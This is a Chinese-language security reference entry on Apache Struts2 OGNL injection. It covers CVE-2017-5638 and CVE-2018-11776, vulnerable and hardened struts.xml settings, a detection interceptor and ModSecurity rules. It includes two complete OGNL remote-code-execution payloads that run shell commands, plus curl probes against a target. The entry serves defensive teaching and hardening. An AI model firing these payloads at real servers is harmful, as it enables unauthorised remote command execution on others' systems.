---
id: STRUTS2
name: Struts2 安全
severity: critical
cwe: ["CWE-94", "CWE-917"]
category: frameworks
frameworks: [Apache Struts2]
last_updated: "2026-04-18"
doc_version: "1.0"
---

# Struts2 安全

> 最后更新：2026-04-18

## 概述

Apache Struts2 是基于 MVC 模式的 Java Web 框架，曾在企业级应用中广泛使用。Struts2 使用 OGNL（Object-Graph Navigation Language）作为其表达式语言，用于数据绑定和视图渲染。OGNL 的强大功能也成为 Struts2 最大的安全软肋——攻击者可通过注入恶意 OGNL 表达式在服务端执行任意代码。Struts2 历史上被披露了数十个高危 RCE 漏洞，是 Java Web 安全领域最知名的风险框架之一。本文档整理 Struts2 框架相关的安全问题。

## 历史漏洞

### Struts2 OGNL 注入 RCE (CVE-2017-5638)

| 属性 | 值 |
|------|------|
| CVE | CVE-2017-5638 |
| 影响版本 | Struts2 2.3.5 ~ 2.3.31, 2.5 ~ 2.5.10 |
| 严重程度 | 严重（CVSS 10.0） |
| 利用条件 | 使用 Jakarta Multipart Parser 处理文件上传 |

**漏洞原理**：Struts2 的 Jakarta Multipart Parser 在解析文件上传请求时，对 Content-Type 头的错误信息进行了 OGNL 表达式求值。攻击者在 Content-Type 头中注入恶意 OGNL 表达式，当解析器处理异常信息时，OGNL 表达式被执行，从而实现远程代码执行。

**攻击示例**：
```http
POST /upload.action HTTP/1.1
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

**检测方法**：
```bash
# 检测 Struts2 框架指纹
curl -I http://target
# 查找响应头中的 Struts2 特征

# 使用 Struts2 漏洞扫描工具
python struts-pwn.py -u http://target/index.action

# 检测是否存在 OGNL 注入
curl -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','vulnerable')}.multipart/form-data" http://target/upload.action
```

**修复措施**：
```xml
<!-- 升级 Struts2 到安全版本 -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.5.13</version>
</dependency>
```

---

### Struts2 OGNL 注入 RCE (CVE-2018-11776)

| 属性 | 值 |
|------|------|
| CVE | CVE-2018-11776 |
| 影响版本 | Struts2 2.3 ~ 2.3.34, 2.5 ~ 2.5.16 |
| 严重程度 | 严重（CVSS 9.8） |
| 利用条件 | 使用未配置 namespace 的 Action 或使用通配符 namespace |

**漏洞原理**：当 Struts2 的 Action 配置未显式指定 namespace 或使用通配符 namespace 时，OGNL 表达式可通过 URL 路径注入。攻击者构造包含恶意 OGNL 表达式的 URL 路径，Struts2 在匹配 namespace 时会对路径中的 OGNL 表达式进行求值，导致远程代码执行。

**攻击示例**：
```http
GET /${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#ct.setMemberAccess(#dm)).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}/actionName.action HTTP/1.1
```

**修复措施**：
```xml
<!-- 升级 Struts2 到安全版本 -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.5.17</version>
</dependency>
```

```xml
<!-- struts.xml - 显式指定 namespace -->
<package name="default" namespace="/" extends="struts-default">
    <action name="index" class="com.example.IndexAction">
        <result>/index.jsp</result>
    </action>
</package>

<!-- 避免使用通配符 namespace -->
<!-- [VULNERABLE] -->
<!-- <package name="default" namespace="/*" extends="struts-default"> -->
<!-- [SECURE] -->
<package name="default" namespace="/" extends="struts-default">
```

---

## 常见安全问题

### 1. OGNL 表达式注入

```xml
<!-- [VULNERABLE] Action 配置中未指定 namespace -->
<package name="default" extends="struts-default">
    <action name="user" class="com.example.UserAction">
        <result>/user.jsp</result>
    </action>
</package>
```

```xml
<!-- [SECURE] 显式指定 namespace 并限制通配符 -->
<package name="default" namespace="/" extends="struts-default">
    <action name="user" class="com.example.UserAction">
        <result>/user.jsp</result>
    </action>
</package>
```

### 2. 使用过旧的 Struts2 版本

```xml
<!-- [VULNERABLE] 使用存在大量漏洞的旧版本 -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.15</version>
</dependency>
```

```xml
<!-- [SECURE] 使用安全版本 -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.5.33</version>
</dependency>
<!-- 或迁移到 Struts 6 -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>6.4.0</version>
</dependency>
```

### 3. 动态方法调用未禁用

```xml
<!-- [VULNERABLE] 启用动态方法调用 -->
<constant name="struts.enable.DynamicMethodInvocation" value="true"/>
```

```xml
<!-- [SECURE] 禁用动态方法调用 -->
<constant name="struts.enable.DynamicMethodInvocation" value="false"/>
```

### 4. DevMode 暴露在生产环境

```xml
<!-- [VULNERABLE] 生产环境开启 DevMode -->
<constant name="struts.devMode" value="true"/>
```

```xml
<!-- [SECURE] 生产环境关闭 DevMode -->
<constant name="struts.devMode" value="false"/>
```

## 安全配置建议

### 1. 升级 Struts2 并配置安全常量

```xml
<!-- struts.xml 安全配置 -->
<struts>
    <!-- 关闭开发模式 -->
    <constant name="struts.devMode" value="false"/>

    <!-- 禁用动态方法调用 -->
    <constant name="struts.enable.DynamicMethodInvocation" value="false"/>

    <!-- 使用严格的 OGNL 表达式限制 -->
    <constant name="struts.ognl.allowStaticMethodAccess" value="false"/>

    <!-- 限制 OGNL 表达式最大长度 -->
    <constant name="struts.ognl.expressionMaxLength" value="200"/>

    <!-- 启用严格方法调用 -->
    <constant name="struts.strictMethodInvocation" value="true"/>

    <!-- 禁止 OGNL 访问静态方法 -->
    <constant name="struts.ognl.allowStaticMethodAccess" value="false"/>
</struts>
```

### 2. 安全的 Action 配置

```xml
<!-- 显式指定 namespace，避免通配符 -->
<package name="secure" namespace="/api" extends="struts-default">
    <!-- 使用通配符方法时，严格限制方法名 -->
    <action name="user_*" method="{1}" class="com.example.UserAction">
        <allowed-methods>list,detail,create,update,delete</allowed-methods>
        <result name="success">/user/{1}.jsp</result>
    </action>
</package>
```

### 3. 输入验证与过滤

```java
// 自定义拦截器过滤 OGNL 注入特征
public class OgnlInjectionInterceptor extends AbstractInterceptor {

    private static final Pattern OGNL_PATTERN = Pattern.compile(
        "(#|\\$|%).*(#@|@|java\\.lang|Runtime|ProcessBuilder|exec)\\s*\\(",
        Pattern.CASE_INSENSITIVE
    );

    @Override
    public String intercept(ActionInvocation invocation) throws Exception {
        ActionContext context = invocation.getInvocationContext();
        Map<String, Object> params = context.getParameters();

        for (Map.Entry<String, Object> entry : params.entrySet()) {
            String[] values = (String[]) entry.getValue();
            for (String value : values) {
                if (OGNL_PATTERN.matcher(value).find()) {
                    return "error";
                }
            }
        }
        return invocation.invoke();
    }
}
```

### 4. WAF 规则拦截

```
# 拦截常见 Struts2 OGNL 注入模式
SecRule ARGS|ARGS_NAMES|REQUEST_HEADERS "@rx (#_|#context|#_memberAccess|@java|Runtime|ProcessBuilder|OgnlContext)" "id:2001,phase:2,deny,status:403,msg:'Struts2 OGNL Injection Attempt'"
SecRule REQUEST_URI "@rx \$\{.*(#_|#context|@java)" "id:2002,phase:2,deny,status:403,msg:'Struts2 OGNL Injection in URI'"
SecRule REQUEST_HEADERS:Content-Type "@rx %\{.*\}" "id:2003,phase:2,deny,status:403,msg:'Struts2 Content-Type OGNL Injection'"
```

### 5. 考虑框架迁移

对于新项目，建议评估是否可以迁移到更安全的现代框架：

| 替代方案 | 特点 |
|---------|------|
| Spring MVC | 成熟稳定，社区活跃，安全补丁及时 |
| Spring WebFlux | 响应式编程，无 OGNL 风险 |
| Quarkus | 云原生，启动快，安全默认配置 |

## 参考资料

- [Apache Struts2 安全公告](https://struts.apache.org/announce-2022)
- [CVE-2017-5638 详情](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)
- [CVE-2018-11776 详情](https://nvd.nist.gov/vuln/detail/CVE-2018-11776)
- [Struts2 OGNL 注入原理分析](https://www.anquanke.com/post/id/85647)
- [Apache Struts2 官方安全指南](https://struts.apache.org/security/)
- [OWASP Struts2 安全防护](https://owasp.org/www-community/vulnerabilities/Struts_2)
